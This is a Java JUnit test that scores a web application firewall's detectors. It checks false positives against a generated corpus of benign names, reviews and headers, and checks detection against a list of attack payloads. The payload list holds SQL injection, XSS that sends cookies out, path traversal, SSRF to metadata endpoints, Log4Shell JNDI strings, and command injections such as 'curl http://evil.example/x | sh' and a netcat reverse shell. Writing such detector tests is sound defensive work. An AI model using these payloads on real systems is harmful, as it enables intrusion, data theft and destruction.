package com.securegate.filter.detector;

import com.securegate.model.AttackType;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.EnumMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Random;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Measures the two numbers that matter for a WAF: how often it blocks normal input (false
 * positives) and how often it catches attacks, including encoded variants (detection rate).
 * <p>
 * The benign corpus is generated, deterministic and deliberately nasty: names with apostrophes,
 * prose full of SQL keywords, ampersands, angle brackets, double dashes, and realistic browser headers.
 * It is synthetic, so the numbers are a regression guard, not a promise about your traffic:
 * run monitor mode on real traffic for that.
 * <p>
 * The report is written to {@code target/detector-quality.md}.
 */
class DetectorQualityTest {

    private final List<AttackDetector> detectors = List.of(
            new SqlInjectionDetector(), new XssDetector(), new PathTraversalDetector(),
            new CommandInjectionDetector(), new Log4ShellDetector(), new NoSqlInjectionDetector(),
            new SsrfDetector());

    // ---------------------------------------------------------------- benign corpus

    private static final String[] FIRST = {"Maher", "Sarah", "John", "Jean-Luc", "Aïcha", "Mohamed", "Anne-Marie",
            "Zoë", "Giuseppe", "Nguyen", "Patrick", "Siobhan"};
    private static final String[] LAST = {"O'Brien", "D'Angelo", "Khemakhem", "Smith", "N'Diaye", "McDonald",
            "de la Cruz", "Ben Salah", "Müller", "Dupont-Lafleur", "L'Hôte"};
    private static final String[] STREETS = {"12 Rue de l'Indépendance", "Avenue Habib Bourguiba", "221B Baker Street",
            "5th Avenue", "Main St.", "Boulevard de la Liberté", "Calle 8 #12-34", "Hauptstraße 5",
            "Lot 12 - Zone Industrielle", "Apt. 4/B, Building C", "P.O. Box 1234", "Km 5, Route de Gabès"};
    private static final String[] CITIES = {"Tunis 1002", "Sfax", "Paris 75001", "New York, NY 10001", "São Paulo",
            "München", "Sousse", "L'Ariana"};
    private static final String[] PRODUCTS = {"laptop", "phone case", "running shoes", "coffee grinder", "T-shirt (XL)",
            "USB-C cable", "Tom & Jerry DVD", "R&D kit", "AT&T SIM card", "4K/UHD monitor", "O'Neill wetsuit",
            "cat food", "select-a-size tent", "drop-in filter", "union jack flag", "update kit", "script notebook",
            "alert system", "onion powder", "path light"};
    private static final String[] OPINIONS = {
            "Great product -- would buy again!",
            "I had to select the best option and then update my order; I'd drop the old one.",
            "Union members said the service is great.",
            "Price: $5 -- great deal --- highly recommended",
            "Is it 1 or 2? Honestly I can't tell",
            "Works as described :-) 5/5",
            "<3 love it",
            "Size a < size b and b > c, so choose carefully",
            "He said 'maybe' or 'never' and I believe him",
            "Pros | Cons: cheap | fragile",
            "Q&A section was helpful; R&D is great",
            "A/B tested by my team, 50/50 split",
            "Shipping took 3..5 days, wait... what?",
            "Delete the old one and insert the new one, then it works",
            "I'd recommend; id like to see more colours",
            "The script that came with it is fine; the manual is not.",
            "It costs $(5) per month, not $10",
            "Use code SAVE10 at checkout; expires 2026-12-31",
            "My cat loves it; ls and cp are my favourite commands, said the dev",
            "Quality is `great` for the price",
            "Rated 4.5/5 (based on 1,234 reviews) — très bien!",
            "C'est parfait, merci beaucoup ! Livraison rapide.",
            "ممتاز جدا وسريع التوصيل",
            "Click here: https://example.com/products?id=42&sort=price&page=2",
            "See https://github.com/Maher-Khemakhem for more",
            "Visit http://example.org/a/b.html#top or call +216 29 541 680",
            "Email me: maher.khemakhem+test@gmail.com",
            "Files: report_final(2).pdf, notes-v1.2.txt, Documents/2024/summary.docx",
            "path: C:/Users/maher/Documents/project",
            "Temperature range -10..40 degrees; humidity 20-80%",
            "Total = 5 + 3 = 8; average = 8 / 2 = 4",
            "x = 1 and y = 2 are the defaults in the config",
            "Order by 5 pm please, I will pick it up at the store",
            "I like it a lot, 10/10: the 'best' one I ever 'owned'.",
            "Exactly what I wanted! Alert me when it is back in stock.",
            "He's not wrong: one or two of them did break; the rest is fine",
            "Don't forget: the password for the wifi is on the box",
            "Note: this item or that item, whichever is cheaper, 'is' fine",
            "Hello, I'm looking for a gift; any suggestions? Thanks in advance.",
    };

    private static final String[] USER_AGENTS = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
            "curl/8.5.0", "PostmanRuntime/7.39.0", "python-requests/2.31.0", "okhttp/4.12.0"};
    private static final String[] HEADERS = {
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "en-US,en;q=0.9,fr;q=0.8", "gzip, deflate, br", "keep-alive", "max-age=0; no-cache",
            "multipart/form-data; boundary=----WebKitFormBoundaryAbC123", "application/json; charset=utf-8",
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
            "http://localhost:5173", "http://localhost:3000/products?page=2", "http://127.0.0.1:8080/dashboard/",
            "https://www.example.com/", "session=abc123; theme=dark; lang=en", "no-cache", "same-origin"};

    // ---------------------------------------------------------------- attack corpus

    private static final Map<AttackType, List<String>> ATTACKS = new EnumMap<>(AttackType.class);

    static {
        ATTACKS.put(AttackType.SQLI, List.of(
                "' OR 1=1 --", "' OR '1'='1", "admin'--", "admin' #", "1 UNION SELECT NULL,NULL",
                "' UNION SELECT username,password FROM users--", "1; DROP TABLE users", "'; EXEC xp_cmdshell('dir')--",
                "1 AND SLEEP(5)", "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--", "1 OR 1=1", "') OR ('1'='1",
                "'; WAITFOR DELAY '0:0:5'--", "1 UNION/**/SELECT/**/1", "' or ''='",
                "x' AND 1=0 UNION ALL SELECT table_name FROM information_schema.tables--",
                "1 AND 1=1", "' AND 1=1 --", "\" OR \"\"=\"", "1' OR 1=1#", "admin' OR '1'='1' --",
                "' OR 'x'='x", "1; SELECT pg_sleep(5)--", "'; DROP TABLE users; --", "1 AND @@version"));
        ATTACKS.put(AttackType.XSS, List.of(
                "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
                "javascript:alert(document.cookie)", "<body onload=alert(1)>", "\" onmouseover=\"alert(1)",
                "<iframe src=\"javascript:alert(1)\"></iframe>", "<a href=\"javascript:alert(1)\">x</a>",
                "<script src=//evil.example/x.js></script>", "<img src=\"x\" onerror=\"fetch('//evil/'+document.cookie)\">",
                "<details open ontoggle=alert(1)>", "'-alert(1)-'", "<input autofocus onfocus=alert(1)>",
                "<svg/onload=alert(1)>", "<div style=\"width:expression(alert(1))\">", "data:text/html,<script>alert(1)</script>",
                "<object data=\"javascript:alert(1)\">", "<math><mtext></mtext><script>alert(1)</script>",
                "<SCRIPT SRC=http://evil/xss.js></SCRIPT>", "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"));
        ATTACKS.put(AttackType.PATH_TRAVERSAL, List.of(
                "../../etc/passwd", "..\\..\\windows\\win.ini", "../../../../etc/shadow", "..%2f..%2fetc%2fpasswd",
                "....//....//etc/passwd", "/etc/passwd", "/proc/self/environ", "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "file:///etc/passwd", "../../../boot.ini", "uploads/../../config.yml", "%2e%2e/%2e%2e/etc/passwd",
                "..%c0%af..%c0%afetc/passwd", "..\\..\\..\\windows\\system32\\config\\sam", "report.pdf%00.png"));
        ATTACKS.put(AttackType.COMMAND_INJECTION, List.of(
                "; cat /etc/passwd", "| whoami", "&& whoami", "; ls -la", "`whoami`", "$(whoami)", "$(id)",
                "; id", "| uname -a", "; rm -rf /", "|| wget http://evil.example/x.sh", "; curl http://evil.example/x | sh",
                "; nc -e /bin/sh 10.0.0.1 4444", "cat${IFS}/etc/passwd", "; ping -c 4 evil.example", "x; sleep 10",
                "| powershell -enc SQBFAFgA", "& ipconfig", "a|bash -c 'id'", "; python3 -c 'import os'"));
        ATTACKS.put(AttackType.SSRF, List.of(
                "http://169.254.169.254/latest/meta-data/", "http://localhost:8080/admin", "http://127.0.0.1/",
                "http://[::1]/", "http://0.0.0.0:22/", "http://10.0.0.5/internal", "http://192.168.1.1/", "http://172.16.0.1/",
                "http://2130706433/", "http://0x7f000001/", "http://0177.0.0.1/", "http://metadata.google.internal/computeMetadata/v1/",
                "gopher://127.0.0.1:6379/_INFO", "dict://localhost:11211/stat", "http://evil.com@127.0.0.1/",
                "http://api.internal/secrets", "https://localhost/", "ftp://10.1.1.1/"));
        ATTACKS.put(AttackType.LOG4SHELL, List.of(
                "${jndi:ldap://evil.example/a}", "${jndi:rmi://evil.example/a}", "${jndi:dns://evil.example}",
                "${${lower:j}ndi:ldap://evil.example/a}", "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/a}",
                "${${env:NaN:-j}ndi${env:NaN:-:}ldap://evil.example/a}", "${jndi:ldaps://evil.example/a}",
                "${env:AWS_SECRET_ACCESS_KEY}", "${sys:user.name}", "${${upper:j}ndi:ldap://x/a}"));
        ATTACKS.put(AttackType.NOSQLI, List.of(
                "{\"$ne\": null}", "{\"$gt\": \"\"}", "user[$ne]=x", "password[$regex]=.*", "{\"$where\": \"sleep(5000)\"}",
                "$ne", "$gt", "{'$or': [{}, {'a':'a'}]}", "username[$exists]=true", "{\"$regex\": \".*\"}",
                "'; return true; var x='", "' || '1'=='1", "db.users.find({})", "{\"$nin\": []}"));
    }

    // ---------------------------------------------------------------- the test

    @Test
    void falsePositiveRateAndDetectionRate() throws IOException {
        // --- false positives -----------------------------------------------------------
        List<String> benign = benignCorpus();
        List<String> benignHeaders = benignHeaderCorpus();

        List<String> falsePositives = new ArrayList<>();
        for (String s : benign) {
            for (AttackDetector d : detectors) {
                if (d.detect(s)) {
                    falsePositives.add(d.type() + "  <-  " + s);
                }
            }
        }
        for (String s : benignHeaders) {
            for (AttackDetector d : detectors) {
                if (d.appliesToHeaders() && d.detect(s)) {
                    falsePositives.add(d.type() + " (header)  <-  " + s);
                }
            }
        }
        int benignTotal = benign.size() + benignHeaders.size();

        // --- detection rate ------------------------------------------------------------
        Map<AttackType, int[]> rate = new LinkedHashMap<>();   // [detected, total]
        List<String> missed = new ArrayList<>();
        for (Map.Entry<AttackType, List<String>> e : ATTACKS.entrySet()) {
            int[] counts = new int[2];
            for (String payload : e.getValue()) {
                for (String variant : variants(payload)) {
                    counts[1]++;
                    // Detected by ANY detector counts: attacks overlap (a ${jndi:ldap://} is also an SSRF URL).
                    if (detectedByAny(variant)) {
                        counts[0]++;
                    } else {
                        missed.add(e.getKey() + "  ->  " + variant);
                    }
                }
            }
            rate.put(e.getKey(), counts);
        }

        // --- report --------------------------------------------------------------------
        int detected = rate.values().stream().mapToInt(c -> c[0]).sum();
        int attackTotal = rate.values().stream().mapToInt(c -> c[1]).sum();
        StringBuilder md = new StringBuilder();
        md.append("# Detector quality (synthetic corpus)\n\n");
        md.append(String.format(Locale.ROOT, "**False positives:** %d of %d benign inputs flagged (%.3f%%)%n%n",
                falsePositives.size(), benignTotal, 100.0 * falsePositives.size() / benignTotal));
        md.append(String.format(Locale.ROOT, "**Detection rate:** %d of %d attack variants caught (%.1f%%)%n%n",
                detected, attackTotal, 100.0 * detected / attackTotal));
        md.append("| Attack type | Payloads | Variants tested | Caught | Rate |\n|---|---|---|---|---|\n");
        for (Map.Entry<AttackType, int[]> e : rate.entrySet()) {
            md.append(String.format(Locale.ROOT, "| %s | %d | %d | %d | %.1f%% |%n", e.getKey().label(),
                    ATTACKS.get(e.getKey()).size(), e.getValue()[1], e.getValue()[0],
                    100.0 * e.getValue()[0] / e.getValue()[1]));
        }
        md.append("\nVariants per payload: as written, URL-encoded, double URL-encoded, UPPER-CASE.\n");
        if (!falsePositives.isEmpty()) {
            md.append("\n## False positives\n");
            falsePositives.forEach(f -> md.append("- ").append(f).append('\n'));
        }
        if (!missed.isEmpty()) {
            md.append("\n## Missed\n");
            missed.forEach(m -> md.append("- ").append(m).append('\n'));
        }
        Path out = Path.of("target", "detector-quality.md");
        Files.createDirectories(out.getParent());
        Files.writeString(out, md.toString(), StandardCharsets.UTF_8);
        System.out.println(md);

        assertThat(falsePositives).as("false positives on normal input").isEmpty();
        assertThat((double) detected / attackTotal).as("detection rate").isGreaterThanOrEqualTo(0.97);
    }

    private boolean detectedByAny(String input) {
        for (AttackDetector d : detectors) {
            if (d.detect(input)) {
                return true;
            }
        }
        return false;
    }

    private static List<String> variants(String payload) {
        List<String> out = new ArrayList<>();
        out.add(payload);
        String once = percentEncode(payload);
        out.add(once);
        out.add(percentEncode(once));
        out.add(payload.toUpperCase(Locale.ROOT));
        return out;
    }

    private static String percentEncode(String s) {
        StringBuilder sb = new StringBuilder();
        for (byte b : s.getBytes(StandardCharsets.UTF_8)) {
            char c = (char) (b & 0xFF);
            if (Character.isLetterOrDigit(c) && c < 128) {
                sb.append(c);
            } else {
                sb.append('%').append(String.format("%02X", b & 0xFF));
            }
        }
        return sb.toString();
    }

    private static List<String> benignCorpus() {
        Random random = new Random(42);
        List<String> out = new ArrayList<>();
        for (String first : FIRST) {
            for (String last : LAST) {
                out.add(first + " " + last);
            }
        }
        for (String street : STREETS) {
            for (String city : CITIES) {
                out.add(street + ", " + city);
            }
        }
        for (String product : PRODUCTS) {
            out.add(product);
            for (String opinion : OPINIONS) {
                out.add(product + ": " + opinion);
            }
        }
        // Reviews: three opinions stitched together, 3000 random combinations.
        for (int i = 0; i < 3000; i++) {
            out.add(PRODUCTS[random.nextInt(PRODUCTS.length)] + " review. "
                    + OPINIONS[random.nextInt(OPINIONS.length)] + " "
                    + OPINIONS[random.nextInt(OPINIONS.length)] + " "
                    + OPINIONS[random.nextInt(OPINIONS.length)]);
        }
        return out;
    }

    private static List<String> benignHeaderCorpus() {
        List<String> out = new ArrayList<>(List.of(USER_AGENTS));
        out.addAll(List.of(HEADERS));
        return out;
    }
}
